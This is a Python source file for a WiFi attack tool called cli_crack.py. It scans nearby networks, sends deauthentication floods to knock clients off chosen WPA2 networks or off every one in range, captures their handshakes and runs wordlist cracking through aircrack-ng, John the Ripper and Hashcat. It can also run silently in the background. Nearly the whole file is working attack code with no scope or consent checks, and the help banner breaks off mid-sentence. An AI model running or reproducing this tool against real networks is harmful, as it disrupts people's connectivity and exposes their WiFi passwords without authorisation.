#!/usr/bin/env python3
import os
import time
import glob
from tabulate import tabulate
import subprocess
import signal
import configparser
import sqlite3
import shutil
import argparse
import re
import sys

class wifi_cracker:

    def __init__(self):
        """
        Initializes the wifi_cracker instance by setting up default 
        variables, checking directories, loading the interface from 
        config, and initializing the SQLite database if needed.
        """
        self.target = None
        self.interface = None
        self.verbose = False
        self.packets = 100
        self.initial_scan = 30
        self.target_scan = 60
        self.headless = False
        self.word_list = None
        self.target_essid = None
        self.target_scan_attempts = None
        self.capture_attempts = None
        self.handshake_captured = False

        self.networks = {} 
        self.table_data = []
        self.directories = ["john", "hc", "logs", "collection","archive"]
        self.db_file = "networks.db"
        

        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        self.log_file = os.path.join("logs", f"{timestamp}.log")
        os.makedirs("logs", exist_ok=True)
        
    
    def initial_config(self):
        self.check_and_create_directories()

    def configure_interface(self):
        """
        Ensures a monitor-mode interface is configured and available.
        Uses base interface names from config.ini (e.g., wlan1, wlp0s20f0u9).
        Automatically detects if their monitor variant is active, or enables it.
        Prompts user only if none match.
        """
        self.log("Configuring interface...", prefix="config")

        config = configparser.ConfigParser()
        config.read("config.ini")

        candidates = []
        if "DEFAULT" in config and "monitor_candidates" in config["DEFAULT"]:
            candidates = [iface.strip() for iface in config["DEFAULT"]["monitor_candidates"].split(",")]

        all_interfaces = self._get_interfaces()

        # Step 1: Try each base candidate
        for base_iface in candidates:
            mon_iface = f"{base_iface}mon"

            if mon_iface in all_interfaces and self._is_monitor_mode(mon_iface):
                self.interface = mon_iface
                self.log(f"Found monitor interface for {base_iface}: {mon_iface}", indent=4, prefix="check")
                return True

            elif base_iface in all_interfaces:
                self.log(f"Found base interface {base_iface}, enabling monitor mode...", indent=4, prefix="-")
                try:
                    self.coms(f'airmon-ng start {base_iface}')
                    new_mon_iface = self._find_monitor_interface()
                    if new_mon_iface:
                        self.interface = new_mon_iface
                        self._update_config(base_iface)  # store base name only
                        self.log(f"Enabled monitor mode on {base_iface} → {new_mon_iface}", indent=4, prefix="check")
                        return True
                except subprocess.CalledProcessError:
                    self.log(f"Failed to enable monitor mode on {base_iface}", prefix="x")

        # Step 2: Detect any current monitor interface
        mon_iface = self._find_monitor_interface()
        if mon_iface:
            self.interface = mon_iface
            base = mon_iface.replace('mon', '')
            self.log(f"Detected monitor interface without config: {mon_iface}", indent=4, prefix="check")
            self._update_config(base)
            return True

        # Step 3: Prompt user
        base_ifaces = [iface for iface in all_interfaces if not iface.endswith('mon')]
        if not base_ifaces:
            self.log("No usable wireless interfaces found. Aborting.", prefix="x")
            sys.exit(1)

        self.log("Available interfaces to enable monitor mode:", prefix="blank")
        self._print_interfaces_table(all_interfaces)

        if not self.headless:
            try:
                iface = input("Enter your wireless interface to put into monitor mode (e.g., wlan1): ").strip()
            except KeyboardInterrupt:
                self.log("User aborted input. Exiting.", prefix="x")
                sys.exit(1)

            if iface not in base_ifaces:
                self.log(f"Invalid interface selected: {iface}", prefix="x")
                sys.exit(1)

            try:
                self.coms(f'airmon-ng start {iface}')
                mon_iface = self._find_monitor_interface()
                if mon_iface:
                    self.interface = mon_iface
                    self._update_config(iface)  # store base iface
                    self.log(f"Enabled monitor mode on: {mon_iface}", indent=4, prefix="check")
                    return True
            except subprocess.CalledProcessError:
                self.log("Failed to enable monitor mode on user-provided interface", prefix="x")
                sys.exit(1)

            self.log("No valid monitor-mode interface found. Aborting.", prefix="x")
            sys.exit(1)
        elif self.headless:
            self.log("No known interfaces nor existing interfaces in monitor mode. " \
            "Please adjust config.ini or run '--mode config'",
            prefix="x"
            )
            sys.exit(1)

    def _get_interfaces(self):
        """
        Returns a dict of wireless interfaces and their properties.
        Includes phy#, MAC, type, txpower, and wdev.
        No logging is performed here; caller handles output or further processing.
        """
        try:
            result = self.coms(['iw', 'dev'], capture_output=True)
            output = result.stdout

            interfaces = {}
            current_iface = None
            current_phy = None

            for line in output.splitlines():
                line = line.strip()

                phy_match = re.match(r'^phy#(\d+)', line)
                if phy_match:
                    current_phy = f"phy#{phy_match.group(1)}"
                    continue

                iface_match = re.match(r'^Interface\s+(\S+)', line)
                if iface_match:
                    current_iface = iface_match.group(1)
                    interfaces[current_iface] = {
                        'phy': current_phy
                    }
                    continue

                if current_iface:
                    type_match = re.match(r'^type\s+(\S+)', line)
                    if type_match:
                        interfaces[current_iface]['type'] = type_match.group(1)
                        continue

                    addr_match = re.match(r'^addr\s+([0-9a-f:]+)', line)
                    if addr_match:
                        interfaces[current_iface]['mac'] = addr_match.group(1)
                        continue

                    txpower_match = re.match(r'^txpower\s+([\d.]+)\s+dBm', line)
                    if txpower_match:
                        interfaces[current_iface]['txpower'] = float(txpower_match.group(1))
                        continue

                    wdev_match = re.match(r'^wdev\s+(0x[\da-f]+)', line)
                    if wdev_match:
                        interfaces[current_iface]['wdev'] = wdev_match.group(1)
                        continue

            return interfaces

        except subprocess.CalledProcessError:
            return {}

        except subprocess.CalledProcessError:
            # Just re-raise, or handle as you prefer (maybe return empty dict or None)
            raise

    def _print_interfaces_table(self, interfaces: dict):
        """
        Print wireless interfaces info in a slim table format using tabulate.
        """
        headers = ["Interface", "Phy", "Type", "MAC Address", "TxPower (dBm)",]

        # Convert dict to list of rows for tabulate
        table_data = []
        for iface, info in interfaces.items():
            row = [
                iface,
                info.get('phy', '-'),
                info.get('type', '-'),
                info.get('mac', '-'),
                info.get('txpower', '-'),
            ]
            table_data.append(row)

        table_str = tabulate(table_data, headers=headers, tablefmt="simple",
            colalign=("left", "left", "left", "left", "left")
        )
        self.log(table_str, prefix="blank", tabulated=True)

    def _is_monitor_mode(self, iface):
        """Checks if the given interface is in monitor mode."""
        try:
            result = self.coms(['iwconfig', iface], capture_output=True)
            return 'Mode:Monitor' in result.stdout  
        except subprocess.CalledProcessError:
            return False

    def _find_monitor_interface(self):
        """Returns the first monitor-mode interface found."""
        try:
            result = self.coms(['iw', 'dev'], capture_output=True, check=True)
            interfaces = re.findall(r'Interface\s+(\S+)', result.stdout)
            for iface in interfaces:
                if self._is_monitor_mode(iface):
                    return iface
        except subprocess.CalledProcessError:
            self.log("Failed to run 'iw dev'", prefix="error")
        return None 

    def _update_config(self, new_iface):
        """Adds a new monitor-mode interface to config.ini under monitor_candidates."""
        config = configparser.ConfigParser()
        config.read("config.ini")

        # Ensure DEFAULT section exists
        if 'DEFAULT' not in config:
            config['DEFAULT'] = {}

        # Get existing candidates or start new set
        candidates = set()
        if 'monitor_candidates' in config['DEFAULT']:
            candidates.update(i.strip() for i in config['DEFAULT']['monitor_candidates'].split(','))

        # Add new interface
        candidates.add(new_iface)

        # Save updated list
        config['DEFAULT']['monitor_candidates'] = ','.join(sorted(candidates))

        try:
            with open("config.ini", "w") as f:
                config.write(f)
            self.log(f"Updated config.ini: added '{new_iface}' to monitor candidates.", prefix="config")
        except Exception as e:
            self.log(f"Failed to update config.ini: {e}", prefix="x")


    def init_database(self):
        """
        Initializes the SQLite database by creating the 'networks' table 
        if it doesn't already exist.
        """
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS networks (
                essid TEXT,
                bssid TEXT PRIMARY KEY,
                channel TEXT,
                power TEXT,
                privacy TEXT,
                authentication TEXT,
                cipher TEXT,
                first_seen TEXT,
                last_seen TEXT
            )
        ''')
        conn.commit()
        conn.close()

    def update_database(self, essid, data):
        """
        Inserts or updates network information in the database based on 
        BSSID. Uses UPSERT to avoid duplicates and update existing rows.
        """
        now = time.strftime("%Y-%m-%d %H:%M:%S")
        conn = sqlite3.connect(self.db_file)
        c = conn.cursor()

        c.execute('''
            INSERT INTO networks (essid, bssid, channel, power, privacy, authentication, cipher, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(bssid) DO UPDATE SET
                essid=excluded.essid,
                channel=excluded.channel,
                power=excluded.power,
                privacy=excluded.privacy,
                authentication=excluded.authentication,
                cipher=excluded.cipher,
                last_seen=excluded.last_seen
        ''', (
            essid,
            data["BSSID"],
            data["Channel"],
            data["Power"],
            data["Privacy"],
            data["Authentication"],
            data["Cipher"],
            now,
            now
        ))

        conn.commit()
        conn.close()

    def log(self, msg, prefix='default', indent=0, tabulated=False):
        """
        Prints formatted log messages to the console with an optional 
        prefix and indentation level, and writes to a log file.
        """
        prefixes = {
            "default" : "[*] ",
            "dot" : "[•] ",
            "check" : "[✓] ",
            "error" : "[!] ",
            "moved" : "[→] ",
            "exited" : "[←] ",
            "plus" : "[+] ",
            "x" : "[X] ",
            "config" : "[▲] ",
            "blank" : "",
            "dash" : "[-] "
        }

        ind = "" if prefix == "blank" else " " * indent
        prefix_str = prefixes.get(prefix, prefixes["default"])
        clean_msg = msg.strip()
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        final_msg = (
            f"{timestamp} {ind}{prefix_str}{clean_msg}"
            if not tabulated
            else f"{timestamp}\n{ind}{prefix_str}{clean_msg}"
        )
        
        if not self.headless:
            print(final_msg, flush=True)

        try:
            with open(self.log_file, "a", encoding="utf-8") as log:
                log.write(final_msg + "\n")
        except Exception as e:
            print(f"[!] Logging to file failed: {e}")

    def coms(self, command, verbose=None, background=False, preexec_fn=None,
            capture_output=False, check=False, text=True, suppress_stderr=False,
            redirect_output=None, screenshot=False):
        """
        Executes a shell command using subprocess, with flexible control over output, logging, and execution mode.

        Parameters:
        ----------
        command : str or list
            The command to execute. Can be a string (executed via shell) or a list of arguments.
        verbose : bool, optional
            If True, shows output in real time unless suppressed by other options. Defaults to None (use self.verbose).
        background : bool, optional
            If True, runs the command in the background using subprocess.Popen. Defaults to False.
        preexec_fn : callable, optional
            A function to execute in the child process before the command runs (used with Popen).
        capture_output : bool, optional
            If True, captures stdout (and optionally stderr) and returns it as a CompletedProcess object.
            Equivalent to subprocess.PIPE for stdout.
        check : bool, optional
            If True, raises CalledProcessError if the command exits with a non-zero status. Defaults to False.
        text : bool, optional
            If True, decodes output to string (text mode). Defaults to True.
        suppress_stderr : bool, optional
            If True, redirects stderr to DEVNULL (i.e., discards it). Works with capture_output or redirect_output.
        redirect_output : file-like object, optional
            If provided, directs stdout to this file or file-like object.
            If suppress_stderr is also True, stderr is discarded; otherwise, stderr is merged into stdout.

        Returns:
        -------
        subprocess.Popen or subprocess.CompletedProcess
            - If background=True: returns a Popen object.
            - If capture_output=True: returns a CompletedProcess with stdout and stderr.
            - If redirect_output is set: returns a CompletedProcess with output redirected to file.
            - Otherwise: returns a CompletedProcess (or suppresses output depending on verbosity).
        """
        if verbose is None:
            verbose = self.verbose  # Use global verbose if not provided

        if isinstance(command, str):
            shell_mode = True
        else:
            shell_mode = False

        if background:
            stdout = None if verbose else subprocess.DEVNULL
            stderr = None if verbose else subprocess.DEVNULL

            return subprocess.Popen(
                command,
                stdout=stdout,
                stderr=stderr,
                stdin=subprocess.DEVNULL,
                shell=shell_mode,
                preexec_fn=preexec_fn
            )
        else:
            if capture_output:
                result = subprocess.run(
                    command,
                    shell=shell_mode,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL if suppress_stderr else (None if verbose else subprocess.PIPE),
                    text=text,
                    check=check
                )

                if verbose:
                    if result.stdout:
                        for line in result.stdout.strip().splitlines():
                            self.log(line, prefix="blank")
                    if result.stderr and not suppress_stderr:
                        for line in result.stderr.strip().splitlines():
                            self.log(line, prefix="blank")

                if screenshot and result.stdout and not verbose:
                    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
                    final_output = result.stdout.strip().splitlines()
                    clean_lines = [ansi_escape.sub('', line).strip() for line in final_output if line.strip()]
                    snapshot = "\n".join(clean_lines[-10:])
                    self.log(snapshot, prefix="blank")

                return result

            elif redirect_output is not None:
                return subprocess.run(
                    command,
                    shell=shell_mode,
                    stdout=redirect_output,
                    stderr=subprocess.DEVNULL if suppress_stderr else subprocess.STDOUT,
                    check=check
                )

            elif verbose:
                proc = subprocess.Popen(
                    command,
                    shell=shell_mode,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    preexec_fn=os.setsid  # creates a new process group
                )

                try:
                    for line in iter(proc.stdout.readline, ''):
                        clean = line.strip()
                        if clean:
                            self.log(clean, prefix="blank")
                except KeyboardInterrupt:
                    self.log("Interrupted. Terminating subprocess group...", prefix="dash")
                    os.killpg(proc.pid, signal.SIGTERM)
                    proc.wait()
                except Exception as e:
                    self.log(f"Error reading process output: {e}", prefix="error")

                proc.stdout.close()
                proc.wait()
                return proc

            else:
                return subprocess.run(
                    command,
                    shell=shell_mode,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    check=check
                )

    def parse_capture_filename(self, filename):
        """
        Parses a capture filename in the format 
        ESSID--BSSID--channel--timestamp and returns its components 
        as a dictionary.
        """
        base = os.path.splitext(os.path.basename(filename))[0]
        parts = base.split("--")
        if len(parts) != 4:
            raise ValueError(f"Invalid capture filename format: {filename}")
        
        essid = parts[0].replace("_", " ")
        bssid = parts[1]
        channel = parts[2]
        timestamp = parts[3]
        
        return {
            "ESSID": essid,
            "BSSID": bssid,
            "Channel": channel,
            "Timestamp": timestamp
        }

    def check_and_create_directories(self):
        """
        Checks for the existence of required directories and the SQLite 
        database. Creates them if they do not exist.
        """
        self.log(f"Checking system structure...", prefix="config")

        for directory_path in self.directories:
            if not os.path.exists(directory_path):
                self.log(f"Directory '{directory_path}' does not exist. Creating it now.", indent=4, prefix="error")
                os.makedirs(directory_path)
            else:
                self.log(f"Directory '{directory_path}' already exists.", indent=4, prefix="check")

        # Check for SQLite database
        self.db_file = "networks.db"
        if not os.path.exists(self.db_file):
            self.log(f"Database '{self.db_file}' does not exist. Initializing it now.", indent=4, prefix="error")
            self.init_database()
        else:
            self.log(f"Database '{self.db_file}' already exists.", indent=4, prefix="check")

    def scan_networks(self):
        """
        Performs a passive scan for nearby networks and populates self.networks and self.wpa2_targets.
        """
        if not self.target_essid:
            self.log("Initializing scan...", prefix="moved")
        self.log(f"Scan timeout: {self.initial_scan} seconds", indent=4, prefix="dot")

        try:
            if os.path.exists("dump-01.csv"):
                self.clean()

            cmd = f"sudo timeout {self.initial_scan}s airodump-ng -w dump --output-format csv --berlin 3 {self.interface}"
            self.coms(cmd)

        except subprocess.CalledProcessError as e:
            if e.returncode == 124:
                self.log("Airodump-ng timed out as expected.", indent=4, prefix="check")
            else:
                self.log(f"Airodump-ng failed with error code {e.returncode}", indent=4, prefix="error")
                return False

        self.networks = {}
        self.wpa2_targets = {}

        try:
            with open("dump-01.csv", "r", encoding="utf-8", errors="ignore") as file:
                lines = file.readlines()
        except FileNotFoundError:
            self.log("dump-01.csv not found after scan.", prefix="error")
            return False

        for line in lines:
            line = line.strip()
            if line.startswith("BSSID"):
                continue
            elif line.startswith("Station MAC"):
                break
            elif line.count(",") > 10:
                fields = line.split(",")
                if len(fields) >= 14:
                    bssid = fields[0].strip()
                    power = fields[8].strip()
                    channel = fields[3].strip()
                    privacy = fields[5].strip()
                    auth = fields[6].strip()
                    cipher = fields[7].strip()
                    essid = fields[13].strip()

                    if essid:
                        net_data = {
                            "BSSID": bssid,
                            "Channel": channel,
                            "Power": power,
                            "Privacy": privacy,
                            "Authentication": auth,
                            "Cipher": cipher
                        }

                        self.networks[essid] = net_data
                        self.update_database(essid, net_data)

                        is_wpa2 = (
                            "WPA2" in privacy.upper() or
                            "WPA2" in auth.upper() or
                            "WPA2" in cipher.upper()
                        )
                        is_open = "OPN" in privacy.upper() or "OPEN" in privacy.upper()
                        is_wep = "WEP" in privacy.upper()
                        is_wpa3 = "WPA3" in privacy.upper() or "SAE" in auth.upper()

                        if is_wpa2 and not is_wep and not is_open and not is_wpa3:
                            self.wpa2_targets[essid] = net_data

        return True

    def display_networks(self):
        self.table_data = []
        for essid, data in self.networks.items():
            self.table_data.append([
                essid,
                data['BSSID'],
                data['Channel'],
                data['Power'],
                data['Privacy'],
                data['Authentication'],
                data['Cipher']
            ])

        headers = ["ESSID", "BSSID", "Channel", "Power", "Encryption", "Auth", "Cipher"]
        self.log("Detected Networks:", prefix="blank")
        table_str = tabulate(self.table_data, headers=headers, tablefmt="fancy_grid")
        self.log(table_str, prefix="blank", tabulated=True)

    def collect(self, mode=None):
        if self.interface is None:
            self.configure_interface()

        if self.target_essid:
            self.collect_targeted()
        elif mode == "auto":
            self.collect_auto_mode()
        else:
            self.collect_manual_mode()

    def collect_manual_mode(self):
        """
        Manual mode: allows repeated manual selection of ESSIDs 
        until the user chooses to quit.
        """
        while True:
            if not self.scan_networks():
                self.log("Scan failed. Exiting manual mode.", prefix="error")
                return False

            #sys.stdout.flush()
            self.display_networks()

            target = input("Enter the Network ESSID ('rs' to rescan,'q' to quit): ").strip()

            if target.lower() in ['q', 'quit']:
                self.log("Exiting manual mode...", prefix="exited")
                self.clean()
                return False
            if target.lower() in ['rs', 'rescan']:
                continue
            if target in self.networks:
                self.capture_handshake(target)
            else:
                self.log("Invalid ESSID selected. Please try again.", prefix="error")

    def collect_auto_mode(self):
        """
        Automatic mode: tries to capture handshakes from all WPA2 networks.
        """
        if not self.scan_networks():
            self.log("Scan failed in auto mode.", prefix="error")
            return False
        
        self.display_networks()

        if not self.wpa2_targets:
            self.log("No WPA2 networks found.", prefix="error")
            return False
        
        self.log("Running in Automatic Mode (WPA2 targets only)...", prefix="config")
        self.log(f"Deauth packets: {self.packets}", indent=4, prefix="dot")
        self.log(f"Deauth timeout: {self.target_scan}", indent=4, prefix="dot")

        for network in self.wpa2_targets:
            self.log(f"Targeting WPA2 network: {network}", prefix='dot')
            self.capture_handshake(network, auto=True)

        self.log("Automatic collection complete.", prefix="check")
        return True

    def collect_targeted(self):
        target = self.target_essid
        max_scan_attempts = self.target_scan_attempts
        max_capture_attempts = self.capture_attempts

        self.log(f"Targeted ESSID: {target}", prefix="config")
        self.log(f"Max scan attempts: {max_scan_attempts}", indent=4, prefix="dot")
        self.log(f"Max capture attempts: {max_capture_attempts}", indent=4, prefix="dot")

        for scan_attempt in range(1, max_scan_attempts + 1):
            self.log(f"[Scan Attempt {scan_attempt}] Scanning for {target}...", prefix="moved")

            if not self.scan_networks():
                self.log("Scan failed.", indent=8, prefix="error")
                continue

            if target in self.networks:
                self.log(f"Found target ESSID '{target}' on scan attempt {scan_attempt}.", prefix="check")
                break
            else:
                self.log(f"Target ESSID '{target}' not found. Retrying...", indent=4, prefix="error")

        else:
            self.log(f"Target ESSID '{target}' not found after {max_scan_attempts} scan attempts.", prefix="x")
            return False

        for cap_attempt in range(1, max_capture_attempts + 1):
            self.log(f"[Capture Attempt {cap_attempt}]", prefix="moved")
            self.capture_handshake(target, auto=True)

            if self.handshake_captured:
                self.log(f"Handshake capture for '{target}' successful after {cap_attempt} attempts.", indent=8, prefix="check")
                return True
            else:
                self.log(f"No handshake detected on attempt {cap_attempt}. Retrying...", indent=4, prefix="exited")

        self.log(f"Failed to capture handshake for '{target}' after {max_capture_attempts} attempts.", prefix="x")
        return False

    def capture_handshake(self, network, auto=False):
        """
        Attempts to capture a WPA2 handshake from the specified network 
        using airodump-ng and aireplay-ng. Checks if the capture file 
        contains an EAPOL handshake and moves it to 'collection' if 
        successful.
        """
        if network not in self.networks:
            self.log(f"Network {network} not found in scan results.", prefix="error")
            return
        self.log(f"Attempting to capture handshake for: {network}\n", indent=4)
        #essid = network.replace(" ", "_")
        essid = re.sub(r'[^\w\-_.]', '_', network)
        bssid = self.networks[network]['BSSID']
        channel = self.networks[network]['Channel']
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"{essid}--{bssid}--{channel}--{timestamp}"
        cap_file = f"{filename}-01.cap"

        # Run a monitor thread on the target network
        airodump_cmd = ["airodump-ng", "-w", filename, "-c", channel, "--bssid", bssid, self.interface]
        # Send deauth packets targeting that specific network

        deauth_cmd = ["aireplay-ng", "-0", str(self.packets), "-a", bssid, self.interface]

        airodump_proc = self.coms(
            airodump_cmd,
            background=True,
            preexec_fn=os.setpgrp
        )

        # Give airodump-ng a few seconds to initialize
        time.sleep(3)

        deauth_proc = self.coms(
            deauth_cmd,
            background=True,
            preexec_fn=os.setpgrp
        )

        # Let both run for 60 seconds
        time.sleep(self.target_scan)

        # Terminate processes gracefully
        for proc in (deauth_proc, airodump_proc):
            try:
                proc.send_signal(signal.SIGINT)  # Send Ctrl-C
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

        if os.path.exists(cap_file):
            self.log(f"Capture file {cap_file} found.", indent=4)
            eapol_check = self.has_eapol(cap_file)
            if eapol_check:
                self.handshake_captured = True
                self.log("EAPOL handshake detected.", prefix="check", indent=4)
                os.makedirs("collection", exist_ok=True)
                os.rename(cap_file, os.path.join("collection", os.path.basename(cap_file)))
                self.log("Capture moved to /collection", prefix="moved", indent=4)
            else:
                self.handshake_captured = False
                self.log("No EAPOL handshake found. Cleaning up.", prefix="x", indent=4)
        else:
            self.log("No capture file created.", prefix="error", indent=4)
        
        self.clean()
    
    def clean(self):
        self.coms("rm -rf *.csv")
        self.coms("rm -rf *.cap")
        self.coms("rm -rf *.netxml")

    def has_eapol(self, cap_file):
        """
        Uses wpapcap2john to check if the .cap file contains a valid 
        EAPOL handshake by searching for the $WPAPSK$ pattern.
        """
        try:
            result = self.coms(["wpapcap2john", cap_file], capture_output=True)
            return "$WPAPSK$" in result.stdout
        except Exception as e:
            self.log(f"Error in has_eapol: {e}", prefix="error")
            return False

    def process_all(self, mode):
        """
        Processes all captured .cap files. Depending on the selected 
        mode (manual or auto), runs cracking and conversion tools like 
        aircrack-ng, wpapcap2john, and hcxpcapngtool. Archives files 
        after processing.

        - Auto mode: batch processes all .cap files.
        - Manual mode: prompts user to select and process files 
          individually.
        """
        def run_aircrack(cap_path, in_file, target):
            """
            Runs aircrack-ng on the .cap file using a wordlist to 
            attempt password cracking. Logs output to a result file.
            """
            self.log(f"Running {self.word_list} aircrack-ng on {cap_path}...",prefix="plus",indent=4)
            result = self.coms([
                "aircrack-ng", "-w", self.word_list,
                "-b", self.networks[target]["BSSID"], cap_path
            ], capture_output=True, screenshot=True)

            self.log(f"Wordlist check complete.",prefix="check",indent=8)

        def run_jtr(cap_path, in_file):
            """
            Converts the .cap file to .john format using wpapcap2john. 
            Splits output into EAPOL and PMKID files for John the Ripper.
            """
            john_dir = "john"
            os.makedirs(john_dir, exist_ok=True)
            input_path = f"{john_dir}/{in_file}.john"
            self.log(f"Running JTR .john conversion...",prefix="plus",indent=4)
            with open(input_path, "w") as outfile:
                self.coms(["wpapcap2john", cap_path], 
                    redirect_output=outfile, 
                    check=True, 
                    suppress_stderr=True
                    )
            with open(input_path, "r") as file:
                lines = file.readlines()

            eapol_lines = [l for l in lines if "$WPAPSK$" in l]
            pmkid_lines = [l for l in lines if "$WPAPSK-PMK$" in l]

            if eapol_lines:
                with open(f"{john_dir}/{in_file}_eapol.john", "w") as f:
                    f.writelines(eapol_lines)
            if pmkid_lines:
                with open(f"{john_dir}/{in_file}_pmkid.john", "w") as f:
                    f.writelines(pmkid_lines)
            
            self.log(f"JTR .john conversion complete.",prefix="check",indent=8)

        def run_hcx(cap_path, in_file):
            """
            Converts the .cap file into Hashcat-compatible .22000 format 
            using hcxpcapngtool.
            """
            hc_dir = "hc"
            os.makedirs(hc_dir, exist_ok=True)
            out_path = f"{hc_dir}/{in_file}.22000"
            self.log(f"Running HCX .22000 conversion...",prefix="plus",indent=4)
            self.coms(f"hcxpcapngtool -o {out_path} {cap_path}")
            self.log(f"HCX .22000 conversion complete.",prefix="check",indent=8)

        def archive(cap_path):
            """
            Moves processed .cap files into the archive/pcap directory 
            for storage.
            """
            os.makedirs("archive/pcap", exist_ok=True)
            shutil.move(cap_path, f"archive/pcap/{os.path.basename(cap_path)}")

        cap_files = glob.glob("collection/*.cap")
        if not cap_files:
            self.log("No .cap files found in /collection", prefix="error")
            return

        if mode == "auto":
            for cap_path in cap_files:
                in_file = os.path.splitext(os.path.basename(cap_path))[0]
                try:
                    info = self.parse_capture_filename(in_file.replace("-01", "") + ".cap")
                    essid = info["ESSID"]
                    self.networks[essid] = {
                        "BSSID": info["BSSID"],
                        "Channel": info["Channel"],
                        "Power": "N/A",
                        "Privacy": "N/A",
                        "Authentication": "N/A",
                        "Cipher": "N/A"
                    }
                    target = essid
                except Exception as e:
                    self.log(f"Failed to parse {cap_path}: {e}", prefix="error")
                    continue

                self.log(f"Processing {cap_path}",prefix="dot")
                run_jtr(cap_path, in_file)
                run_hcx(cap_path, in_file)
                run_aircrack(cap_path, in_file, target)
                self.log(f"Processing complete.",prefix="check",indent=4)                

        elif mode == "manual":
            while True:
                cap_files = glob.glob("collection/*.cap")
                if not cap_files:
                    self.log("No .cap files found in /collection", prefix="error")
                    break

                self.log("Available .cap files:",prefix="blank")
                for idx, f in enumerate(cap_files, 1):
                    self.log(f"{idx}. {f}", indent=4, prefix="dot")

                choice = input("Enter the full path of the file to process (or 'q' to quit): ").strip()
                if choice.lower() == "q":
                    break
                if not os.path.isfile(choice):
                    self.log("Filename invalid. Try again.", prefix="error")
                    continue

                in_file = os.path.splitext(os.path.basename(choice))[0]
                try:
                    info = self.parse_capture_filename(in_file.replace("-01", "") + ".cap")
                    essid = info["ESSID"]
                    self.networks[essid] = {
                        "BSSID": info["BSSID"],
                        "Channel": info["Channel"],
                        "Power": "N/A",
                        "Privacy": "N/A",
                        "Authentication": "N/A",
                        "Cipher": "N/A"
                    }
                    target = essid
                except Exception as e:
                    self.log(f"Failed to parse {choice}: {e}", prefix="error")
                    continue

                self.log("Select processing option:", prefix="moved")
                self.log("1. Aircrack-ng with wordlist (WPA2 only)", indent=4, prefix="dot")
                self.log("2. JTR (.john)", indent=4, prefix="dot")
                self.log("3. Hashcat (.22000)", indent=4, prefix="dot")
                self.log("4. All of the above", indent=4, prefix="dot")
                method = input("Enter option number: ").strip()
                self.log(f"Processing {choice}", prefix="moved")
                if method == "1":
                    run_aircrack(choice, in_file, target)
                elif method == "2":
                    run_jtr(choice, in_file)
                elif method == "3":
                    run_hcx(choice, in_file)
                elif method == "4":
                    run_jtr(choice, in_file)
                    run_hcx(choice, in_file)
                    run_aircrack(choice, in_file, target)
                else:
                    self.log("Invalid option.", prefix="error")
                    continue

                archive(choice)
                self.log(f"Processing complete.",prefix="check",indent=4)
        else:
            self.log("Invalid mode argument to process_all().", prefix="error")

class RawFormatter(argparse.HelpFormatter):
    def _fill_text(self, text, width, indent):
        # Return text unchanged — no wrapping or indentation added
        return text

def is_running_under_nohup():
            return os.getenv("NOHUP_ACTIVE") == "1"

def reexec_with_nohup():
    args = ["nohup", sys.executable] + sys.argv
    env = os.environ.copy()
    env["NOHUP_ACTIVE"] = "1"
    
    # Send stdout and stderr to /dev/null
    with open(os.devnull, "w") as devnull:
        subprocess.Popen(
            args,
            stdout=devnull,
            stderr=devnull,
            stdin=subprocess.DEVNULL,
            env=env
        )
    sys.exit(0)

if __name__ == "__main__":
    __version__ = "0.1.0"

    parser = argparse.ArgumentParser(
        description="""\
    ┌────────────────────────────────────────────────────────────┐
    │        WiFi Handshake Collector and Processor Tool         │
    ├────────────────────────────────────────────────────────────┤
    │  Modes:                                                    │
    │    • collect-*  → Initial scan for nearby AP's, optional   │
    │                   targeting of stated networks for a       │
    │                   deauth attack.                           │
    │    • process-*  → Runs a series of hash isolation and      │
    │                   analyzation for stored EAPOL PCAPs.      │
    │    • full-*     → Configures and runs Collection and       │
    │                   Processing sequencially.                 │ 
    │    • *-manual   → Specify target network for collection,   │
    │                   and pcap analysis for processing. This   │
    │                   requires terminal input from the user.   │
    │    • *-auto     → Attempts deauth attack for all WPA2      │
    │                   networks detected during the Initial     │
    │                   Scan for collection, and executes all    │
    │                   processing methods for all pcaps in the  │
    │                   collection directory.                    │
    │    • target     → Runs scanning on specific essid          │
    │                   until it is detected and an EAPOL        │
    │                   handshake is intercepted.                │
    │    • config     → Configures interface for headless        │
    │                   operation.                               │
    │                                                            │
    │  Requirements:                                             │
    │    • python3 installation                                  │
    │    • wifi card capable of monitor mode                     │
    │    • aircrack-ng suite (includes airodump-ng, aireplay-ng, │
    │      aircrack-ng)                                          │
    │    • John the Ripper Jumbo (for wpapcap2john)              │
    │    • rockyou.txt (or specify another file)                 │
    │                                                            │
    │  Install on Debian/Ubuntu:                                 │
    │    sudo apt install aircrack-ng john                       │
    ├────────────────────────────────────────────────────────────┤
    │  General Usage:                                            │
    │    This program is designed to aid in the collection and   │
    │    processing of general Wifi connections. Note that some  │
    │    processing methods are hardware intensive and are       │
    │    better executed on dedicated systems. This program      │
    │    segments the collection and processing aspects to aid   │
    │    in this limitation. Hashcat and JTR functions are       │
    │    available within their respective folders for these     │
    │    purposes. I would advise only attempting the wordlist   │
    │    attack on less-capable systems. However, this main      │
    │    program does automatically parse through pcap data and  │
    │    preformat it into .22000 and .john formats for          │
    │    condensed data storage.                                 │
    │                                                            │
    │    For -H headless, the interface must already be added to │
    │    the configs or be in monitor mode for the program to    │
    │    avoid needing user input, i.e. run '--mode config'      │
    │    first.                                                  │
    │                                                            │
    │    Please reference -h for specific variables to tailor    │
    │    unique collection or processing requirements.           │
    │                                                            │
    │  Examples:                                                 │
    │    sudo ./cli_crack.py --mode collect-manual               │
    │       → Runs collection in manual mode, a good place to    │
    │       start for new users.                                 │
    │                                                            │
    │    sudo ./cli_crack.py --mode full-auto -H                 │
    │       → Runs the both collect and process modes in auto    │
    │       sub-mode as a background process. All output         │
    │       available in respective logs for review.             │
    │                                                            │
    │    sudo ./cli_crack.py --mode target --TID [essid]         │
    │       → Cycles network detection until ESSID is present,   │
    │       then conducts handshake attack until EAPOL is        │
